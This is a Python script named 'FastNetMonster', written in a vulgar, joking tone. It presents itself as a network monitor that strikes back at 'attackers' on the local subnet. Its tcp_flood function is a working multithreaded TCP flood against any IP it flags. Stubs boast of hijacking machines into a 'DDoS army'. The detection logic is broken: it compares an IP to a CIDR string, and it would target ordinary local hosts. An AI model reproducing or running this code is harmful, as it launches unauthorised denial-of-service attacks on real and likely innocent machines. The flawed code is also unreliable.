import os
import sys
import logging
import random
import string
import socket
import threading

# Configure your network settings
interface = "wlan0"  # Change this to your Termux network interface
ip_range = "192.168.1.0/24"
notification_cmd = "echo 'FastNetMonster Alert!' | festival --tts"
port = 80
threads = 10
flooding_duration = 60  # Duration of the flood attack in seconds

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Generate a random string for marking hijacked machines
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

# Annoying-ass notification system
def notify(msg):
    os.system(notification_cmd)
    logging.info(msg)

# Execute attack handling script
def handle_attack(ip):
    mark = random_string(8)
    os.system(f"iptables -A INPUT -s {ip} -j DROP -m comment --comment 'FastNetMonster: {mark}'")
    notify(f"Attack detected from {ip}. Fucking their shit up with mark '{mark}'!")
    bgp_announce(ip)
    hijack(ip)
    spider_sperm(ip)  # 🕷️🍆💦
    tcp_flood(ip)  # 🔫💦

# Monitor network traffic
def monitor_traffic():
    logging.info("Starting FastNetMonster network monitoring...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.bind((interface, port))
    while True:
        packet = sock.recvfrom(65565)
        ip = packet[1][0]
        if ip in ip_range:
            handle_attack(ip)

# Spread the word via BGP announcements
def bgp_announce(ip):
    # Implement code to send BGP announcements to other networks
    notify(f"Sending BGP announcements to warn about {ip}")

# Hijack the attacker's machine for DDoS attacks
def hijack(ip):
    # Implement code to hijack the machine and use it for DDoS attacks
    notify(f"Hijacking {ip} and adding it to our DDoS army!")

# Shoot spider sperm out of their dicks like there's no tomorrow
def spider_sperm(ip):
    # Implement code to shoot spider sperm and cause mayhem
    notify(f"🕷️🍆💦 Shooting spider sperm at {ip} like there's no tomorrow!")

# TCP flood attack function
def tcp_flood(ip):
    def attack():
        for _ in range(flooding_duration):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            payload = random_string(1024)
            sock.sendall(payload.encode())
            sock.close()
    for _ in range(threads):
        threading.Thread(target=attack).start()
    notify(f"🔫💦 Launching TCP flood attack with {threads} threads for {flooding_duration} seconds!")

# Main function to run FastNetMonster
def main():
    try:
        monitor_traffic()
    except KeyboardInterrupt:
        logging.info("FastNetMonster is shutting down. Goodbye, motherfuckers!")
        sys.exit(0)

if __name__ == "__main__":
    main()
